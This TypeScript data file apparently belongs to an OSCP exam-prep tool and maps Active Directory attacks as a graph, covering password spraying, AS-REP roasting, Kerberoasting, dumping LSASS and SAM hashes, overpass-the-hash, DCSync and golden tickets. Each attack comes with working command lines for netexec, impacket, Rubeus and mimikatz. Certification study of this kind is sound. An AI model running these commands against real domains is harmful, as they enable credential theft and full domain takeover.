import type { OscpContent } from '@/types/oscp'

/** Phase: Active Directory authentication attacks. */
const adAttacks: OscpContent = {
    nodes: [
        {
            id: 'ad-password-spray',
            title: 'Password spraying',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'One password (or a season+year / company name) against every user. Always read the lockout policy first - a bad threshold locks the domain and ends your exam attempt.',
            commands: [
                {
                    label: 'Check policy, then spray',
                    code: `netexec smb <dc> -u <user> -p <pass> --pass-pol
netexec smb <dc> -u users.txt -p 'Autumn2024!' --continue-on-success
kerbrute passwordspray -d <domain> --dc <dc> users.txt 'Autumn2024!'`,
                },
                {
                    label: 'CME / netexec across the subnet',
                    code: `netexec smb <subnet>/24 -u users.txt -p 'Welcome1' --continue-on-success
netexec smb <dc> -u users.txt -p passwords.txt --continue-on-success`,
                },
            ],
            tags: ['spray', 'lockout', 'kerbrute', 'netexec'],
        },
        {
            id: 'ad-asrep-roast',
            title: 'AS-REP roasting',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'Users with "Do not require Kerberos preauth" hand out a crackable AS-REP without any credentials. Crack with hashcat -m 18200.',
            commands: [
                {
                    label: 'Request AS-REP hashes',
                    code: `impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <dc>
# with creds, auto-find:
impacket-GetNPUsers <domain>/<user>:<pass> -request -dc-ip <dc>`,
                },
                {
                    label: 'Crack AS-REP',
                    code: `hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast`,
                },
            ],
            tags: ['as-rep', 'getnpusers', '18200', 'preauth'],
        },
        {
            id: 'kerberoast',
            title: 'Kerberoasting',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'Any domain user can request the TGS of a service account (SPN) and crack it offline. Service accounts often have weak, non-expiring passwords. Use impacket-GetUserSPNs or Rubeus kerberoast, then hashcat -m 13100.',
            commands: [
                {
                    label: 'Request TGS hashes',
                    code: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request
# or, on a domain host:
Rubeus.exe kerberoast /outfile:tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt`,
                },
                {
                    label: 'Crack TGS',
                    code: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt tgs.txt`,
                },
            ],
            tags: ['kerberoast', 'getuserspns', 'rubeus', '13100', 'spn'],
        },
        {
            id: 'ad-dump-creds',
            title: 'Dump credentials (mimikatz/secretsdump)',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'Once you are local admin on any domain host, pull cached hashes and tickets from LSASS. Domain-user creds here often unlock a higher-value account elsewhere.',
            commands: [
                {
                    label: 'Local + remote',
                    code: `# on host (mimikatz):
sekurlsa::logonpasswords
# remote with admin creds:
impacket-secretsdump <domain>/<user>:<pass>@<target>`,
                },
                {
                    label: 'SAM + LSA remotely',
                    code: `netexec smb <target> -u <user> -p <pass> --sam --lsa
reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save & reg save HKLM\\SECURITY security.save`,
                },
            ],
            tags: ['mimikatz', 'secretsdump', 'lsass', 'logonpasswords'],
        },
        {
            id: 'overpass-the-hash',
            title: 'Overpass-the-Hash (hash -> ticket)',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'Turn an NTLM hash into a Kerberos TGT, then use it for Kerberos-only services. Useful when PtH over SMB is blocked but Kerberos is open.',
            commands: [
                {
                    label: 'Hash -> TGT',
                    code: `impacket-getTGT <domain>/<user> -hashes :<NTLM>
export KRB5CCNAME=<user>.ccache
impacket-psexec -k -no-pass <domain>/<user>@<target>`,
                },
                {
                    label: 'Rubeus / mimikatz PTH',
                    code: `Rubeus.exe asktgt /user:<user> /rc4:<NTLM> /ptt
# mimikatz:
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM> /run:powershell`,
                },
            ],
            tags: ['overpass-the-hash', 'gettgt', 'kerberos', 'ptt'],
        },
        {
            id: 'dcsync',
            title: 'DCSync',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'With replication rights (Domain Admin, or an account granted DS-Replication-Get-Changes-All), ask the DC to replicate secrets - including the krbtgt and Administrator hashes. This is game over and the launchpad for a golden ticket.',
            commands: [
                {
                    label: 'Replicate all hashes',
                    code: `impacket-secretsdump <domain>/<user>:<pass>@<dc> -just-dc
# on a domain host (mimikatz):
lsadump::dcsync /domain:<domain> /user:krbtgt
lsadump::dcsync /domain:<domain> /all`,
                },
                {
                    label: 'Single-user DCSync',
                    code: `impacket-secretsdump <domain>/<user>:<pass>@<dc> -just-dc-user krbtgt
impacket-secretsdump <domain>/<user>:<pass>@<dc> -just-dc-user Administrator`,
                },
            ],
            tags: ['dcsync', 'secretsdump', 'krbtgt', 'replication', 'mimikatz'],
        },
        {
            id: 'kerberos-clock-skew',
            title: 'Kerberos clock skew',
            type: 'finding',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'Kerberos rejects tickets when the client clock drifts more than ~5 minutes from the DC. When ticket attacks fail with clock-skew errors, sync your box to the DC with ntpdate or faketime before forging/using tickets.',
            commands: [
                {
                    label: 'Sync your clock to the DC',
                    code: `ntpdate -s <dc>
# or, if NTP is blocked:
faketime "$(date -d @$(($(date +%s)+300)) )" impacket-psexec ...`,
                },
                {
                    label: 'Measure skew',
                    code: `nmap -sV -p88 --script krb5-enum-users <dc>
date; ntpdate -q <dc>`,
                },
            ],
            tags: ['clock-skew', 'kerberos', 'ntpdate', 'faketime'],
        },
        {
            id: 'golden-ticket',
            title: 'Golden ticket',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'With the krbtgt NTLM hash (from DCSync) you can forge a TGT that impersonates any user - including Domain Admin - forever. Watch the clock-skew, and note this is very loud.',
            commands: [
                {
                    label: 'Forge + inject a TGT',
                    code: `impacket-ticketer -nthash <krbtgt-ntlm> -domain-sid <sid> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<dc>`,
                },
                {
                    label: 'mimikatz golden',
                    code: `kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<krbtgt-ntlm> /ptt
# then: psexec.exe \\\\<dc> cmd.exe`,
                },
            ],
            tags: ['golden-ticket', 'ticketer', 'krbtgt', 'tgt'],
        },
    ],
    edges: [
        { from: 'ad-password-spray', to: 'creds-found', label: 'hit' },
        { from: 'ad-asrep-roast', to: 'hash-to-crack', label: 'crack -m 18200' },
        { from: 'kerberoast', to: 'hash-to-crack', label: 'crack -m 13100' },
        { from: 'ad-dump-creds', to: 'creds-found', label: 'plaintext / reusable creds' },
        { from: 'ad-dump-creds', to: 'hash-to-crack', label: 'NTLM hashes' },
        { from: 'ad-dump-creds', to: 'dcsync', label: 'got replication rights' },
        { from: 'overpass-the-hash', to: 'psexec-lateral', label: 'ticket -> exec' },
        { from: 'dcsync', to: 'domain-admin', label: 'krbtgt / admin hash' },
        { from: 'creds-found', to: 'kerberoast', label: 'any domain user can roast' },
        { from: 'kerberoast', to: 'kerberos-clock-skew', label: 'clock-skew on ticket use' },
        { from: 'kerberos-clock-skew', to: 'golden-ticket', label: 'clock synced -> forge TGT' },
        { from: 'dcsync', to: 'golden-ticket', label: 'krbtgt hash -> forge' },
        { from: 'golden-ticket', to: 'domain-admin', label: 'forge Domain Admin TGT' },
    ],
}

export default adAttacks
